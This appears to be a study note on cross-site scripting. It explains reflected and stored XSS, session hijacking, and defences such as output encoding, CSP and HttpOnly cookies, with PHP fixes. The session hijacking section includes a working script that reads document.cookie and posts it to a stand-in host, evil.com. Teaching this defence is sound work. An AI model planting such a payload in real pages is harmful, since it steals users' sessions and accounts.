> [!idea] Cross-Site Scripting (XSS)
>
> Cross-Site Scripting (XSS) is a type of web application vulnerability that **allows an attacker to inject malicious scripts into web pages** viewed by other users. These scripts can be used to **hijack user sessions, steal sensitive data, deface websites**, or perform other unauthorized actions.
>
> The core issue with XSS is the failure of the web application to properly sanitize user input before rendering it in the browser. This allows attackers to inject client-side scripts that execute in the victim's browser with the same privileges as the legitimate website.

> [!example] Reflected XSS
>
> Reflected XSS occurs when user input is immediately reflected in the web page's response without proper sanitization. A common example is a search field that echoes the user's input as part of the search results page.
>
> ```html
> <!-- vulnerable code -->
> <input type="text" name="query">
> <p>You searched for: <span><!-- user input is inserted here --></span></p>
>
> <!-- attack payload -->
> https://example.com/search?query=<script>/*malicious code*/</script>
> ```
>
> When the user visits the URL with the malicious script injected in the `query` parameter, the script will execute in the victim's browser. This type of XSS is typically non-persistent and requires social engineering to trick users into visiting a specially crafted URL.

> [!example] Stored XSS
>
> Stored XSS, also known as Persistent XSS, occurs when user input is stored on the server (e.g., in a database) and later rendered in web pages without proper sanitization.
>
> ```html
> <!-- vulnerable code -->
> <div>
>   <!-- user input from the database is inserted here -->
> </div>
>
> <!-- attack payload in the database -->
> <script>/*malicious code*/</script>
> ```
>
> When the web page loads the user input from the database, the malicious script will execute in the victim's browser. This type of XSS is more severe as the payload persists and can potentially impact any user viewing the vulnerable page.

> [!example] Session Hijacking with XSS
>
> One common attack enabled by XSS is session hijacking, where the attacker steals the victim's session cookie and impersonates them on the website.
>
> ```js
> // attack payload
> <script>
>   var cookie = document.cookie;
>   fetch('https://evil.com/steal', {
>     method: 'POST',
>     body: cookie
>   });
> </script>
> ```
>
> When the XSS payload executes, it sends the victim's session cookie to the attacker's server. The attacker can then use this cookie to hijack the victim's session and access their account or sensitive data.

> [!consider] Defending Against XSS
>
> Preventing XSS requires proper input sanitization and output encoding on the server-side. Here are some common defense strategies:
>
> - **Input Validation**: Sanitize all user input by removing or escaping potential script tags and other dangerous characters.
> - **Output Encoding**: Encode user input before rendering it in the browser, ensuring that special characters are treated as plain text.
> - **Content Security Policy (CSP)**: Implement a CSP to whitelist trusted sources for scripts and other resources, effectively blocking injected scripts from executing.
> - **HttpOnly Cookies**: Set the `HttpOnly` flag on session cookies to prevent client-side scripts from accessing them, mitigating session hijacking.
> - **User Education**: Train users to be cautious of suspicious links or emails that may lead to XSS attacks.

> [!consider] Preventing XSS in PHP
>
> In PHP, developers should use built-in functions like `htmlspecialchars()` and `strip_tags()` to sanitize user input before rendering it in web pages.
>
> ```php
> // vulnerable code
> echo "<p>Welcome, " . $_GET['name'] . "!</p>";
>
> // preventing XSS with htmlspecialchars()
> echo "<p>Welcome, " . htmlspecialchars($_GET['name']) . "!</p>";
>
> // preventing XSS with strip_tags()
> echo "<p>Welcome, " . strip_tags($_GET['name']) . "!</p>";
> ```
>
> By default, `htmlspecialchars()` converts special characters like `<`, `>`, and `&` into their respective HTML entities, preventing script injection. `strip_tags()` removes any HTML tags from the input, effectively neutralizing script tags.

> [!consider] Preventing Session Hijacking
>
> To prevent session hijacking, developers should implement the following security measures:
>
> - **HttpOnly Cookies**: Set the `HttpOnly` flag on session cookies to prevent client-side scripts from accessing them.
> - **Secure Cookies**: Use the `Secure` flag to ensure cookies are only transmitted over HTTPS, preventing eavesdropping on insecure connections.
> - **Regenerate Session IDs**: After successful authentication, regenerate the session ID to mitigate session fixation attacks.
> - **Short Session Timeouts**: Set short session timeouts to minimize the window of opportunity for hijacking.
> - **CSRF Protection**: Implement CSRF protection mechanisms to prevent unauthorized state changes.

> [!consider] Content Security Policy (CSP)
>
> A Content Security Policy (CSP) is an added layer of security that helps mitigate XSS attacks by whitelisting trusted sources for resources like scripts, styles, and images.
>
> ```html
> <!-- Example CSP header -->
> Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
> ```
>
> In this example, the CSP only allows scripts from the website's origin (`'self'`) and the trusted `https://trusted.com` domain. Any injected scripts from untrusted sources will be blocked by the browser, effectively preventing XSS attacks.
>
> CSPs can be configured to enforce stricter policies, such as disabling inline scripts or eval()-based code execution, further reducing the attack surface for XSS.

This note covers the main concepts of Cross-Site Scripting (XSS), including reflected and stored XSS, session hijacking, and various defense mechanisms like input sanitization, output encoding, Content Security Policy (CSP), and secure cookie handling. Relevant examples and code snippets are provided to illustrate the key ideas.